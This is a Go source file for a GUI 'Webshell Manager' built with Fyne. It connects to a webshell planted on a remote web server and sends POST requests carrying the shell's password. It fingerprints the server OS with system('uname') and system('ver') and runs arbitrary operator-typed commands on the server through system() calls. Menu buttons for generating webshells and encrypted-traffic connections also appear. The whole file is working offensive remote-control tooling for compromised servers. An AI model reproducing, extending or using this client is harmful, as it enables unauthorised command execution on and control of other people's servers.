package main

import (
	"bytes"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/flopp/go-findfont" //解决fyne中文乱码
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

var a fyne.App
var w fyne.Window
var selectedType string // 添加一个全局变量来保存当前选择的连接类型
var sidebar *fyne.Container

type ConnectionInfo struct {
	URL      string
	Password string
	Type     string
	OS       string
}

var detectedOS string

// 保存连接信息的切片
var connections []ConnectionInfo

func init() {
	//设置中文字体
	fontPaths := findfont.List()
	for _, path := range fontPaths {
		if strings.Contains(path, "msyh.ttf") || strings.Contains(path, "simhei.ttf") || strings.Contains(path, "simsun.ttc") || strings.Contains(path, "simkai.ttf") {
			os.Setenv("FYNE_FONT", path)
			break
		}
	}
}

func main() {

	a := app.New()

	icon, _ := fyne.LoadResourceFromPath("decal.ico")
	a.SetIcon(icon)

	w = a.NewWindow("Webshell管理器")

	w.Resize(fyne.NewSize(800, 600))

	sidebar = showSidebar(w)

	loadConnections()

	fmt.Println(os.Getwd())

	w.SetContent(firstPage())

	w.ShowAndRun()
}

// 定义主页面的内容和布局
func mainPage() *fyne.Container {

	connectButton := widget.NewButton("普通马连接", func() {
		showConnectDialog(w)
	})

	encryptButton := widget.NewButton("流量加密连接", func() {
		showConnectPage(w)
	})

	backButton := widget.NewButton("返回主页", func() {
		w.SetContent(firstPage())
	})

	return container.NewVBox(
		widget.NewLabel("Welcome to WebShell Manager"),
		connectButton,
		encryptButton,
		backButton,
	)
}

func firstPage() *fyne.Container {

	backButton := widget.NewButtonWithIcon("添加连接", theme.ContentAddIcon(), func() {
		w.SetContent(mainPage())
	})

	generateWebshellButton := widget.NewButtonWithIcon("生成webshell", theme.ContentAddIcon(), func() {
		showWebshellGenerationPage(w)
	})

	sidebar := showSidebar(w)

	split := container.NewHSplit(
		sidebar,
		container.NewCenter(container.NewVBox(backButton, generateWebshellButton)),
	)
	split.Offset = 0.8 // 设置侧边栏占比

	return container.NewBorder(nil, nil, nil, nil, split)
}

func showConnectDialog(w fyne.Window) {

	urlEntry := widget.NewEntry()
	urlEntry.SetPlaceHolder("URL...")

	passwordEntry := widget.NewEntry()
	passwordEntry.SetPlaceHolder("Password...")

	backButton := widget.NewButton("返回主页", func() {
		w.SetContent(mainPage())
	})

	combo := widget.NewSelect([]string{"JSP", "ASP", "ASPX", "PHP"}, func(selected string) {
		selectedType = selected
	})

	connectButton := widget.NewButton("连接", func() {

		url := urlEntry.Text
		password := passwordEntry.Text

		if selectedType == "JSP" {
			JSPConnection(w, url, password)
		} else if selectedType == "ASP" {
			ASPConnection(w, url, password)
		} else if selectedType == "PHP" {
			PHPConnection(w, url, password)
		} else if selectedType == "ASPX" {
			ASPXConnection(w, url, password)
		}

		showSidebar(w)
	})

	content := container.NewVBox(
		urlEntry,
		passwordEntry,
		combo,
		connectButton,
		backButton,
	)

	w.SetContent(content)
}

func PHPConnection(w fyne.Window, url, password string) {

	reqBody := fmt.Sprintf("%s=%s", password, "echo 'connection_successful';")

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(reqBody))
	if err != nil {

		dialog.ShowError(fmt.Errorf("Request error: %v", err), w)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {

		dialog.ShowError(fmt.Errorf("Read response error: %v", err), w)
		return
	}

	fmt.Printf("Response body: %s\n", string(body))

	if strings.Contains(string(body), "successful") {

		selectedType = "PHP"
		addConnection(url, password, selectedType)
		showCommandPage(w, url, password)
	} else {

		dialog.ShowInformation("Connection Failed", fmt.Sprintf("Unexpected response: %s", string(body)), w)
	}
}

func detectOs(url, password string) (string, error) {

	unameCommand := fmt.Sprintf("%s=system('uname');", password)
	verCommand := fmt.Sprintf("%s=system('ver');", password)

	fmt.Printf("Sending uname request: %s\n", unameCommand)
	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(unameCommand))
	if err != nil {
		return "", fmt.Errorf("Request error: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("Read response error: %v", err)
	}

	fmt.Printf("uname response body: %s\n", string(body))

	if strings.Contains(string(body), "Linux") {
		return string("Linux"), nil
	}

	fmt.Printf("Sending ver request: %s\n", verCommand)
	resp, err = http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(verCommand))
	if err != nil {
		return "", fmt.Errorf("Request error: %v", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("Read response error: %v", err)
	}

	fmt.Printf("ver response body: %s\n", string(body))

	if strings.Contains(string(body), "Microsoft") {
		return string("Windows"), nil
	}

	return "Unknown", nil
}

func showCommandPage(w fyne.Window, url, password string) {

	commandEntry := widget.NewEntry()
	commandEntry.SetPlaceHolder("Enter command...")

	output := widget.NewMultiLineEntry()
	output.Wrapping = fyne.TextWrapWord
	output.SetText("") // 设置初始内容为空

	scrollContainer := container.NewScroll(output)
	scrollContainer.SetMinSize(fyne.NewSize(600, 400))

	osLabel := widget.NewLabel("Detecting OS...")
	go func() {
		detectedOS, _ = detectOs(url, password)
		osLabel.SetText(fmt.Sprintf("OS: %s", detectedOS))
	}()

	executeCommand := func(url, password, command string) {

		wrappedCommand := fmt.Sprintf("system(\"%s\");", command)

		reqBody := fmt.Sprintf("%s=%s", password, wrappedCommand)

		resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(reqBody))
		if err != nil {

			output.SetText(fmt.Sprintf("Request error: %v", err))
			return
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {

			output.SetText(fmt.Sprintf("Read response error: %v", err))
			return
		}

		var displayText string
		if detectedOS == "Windows" {

			utf8Body, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(body))
			if err != nil {

				output.SetText(fmt.Sprintf("Encoding conversion error: %v", err))
				return
			}
			displayText = utf8Body
		} else {
			displayText = string(body)
		}

		fmt.Printf("Response body: %s\n", displayText)

		output.SetText(displayText)
	}

	executeButton := widget.NewButton("Execute", func() {

		command := commandEntry.Text

		executeCommand(url, password, command)
	})

	backButton := widget.NewButton("返回主页", func() {
		w.SetContent(firstPage())
	})

	commandPage := container.NewVBox(
		commandEntry,
		executeButton,
		scrollContainer,
		osLabel,
		backButton,
	)

	tabs := container.NewAppTabs(
		container.NewTabItem("命令执行", commandPage),
	)

	w.SetContent(tabs)
}
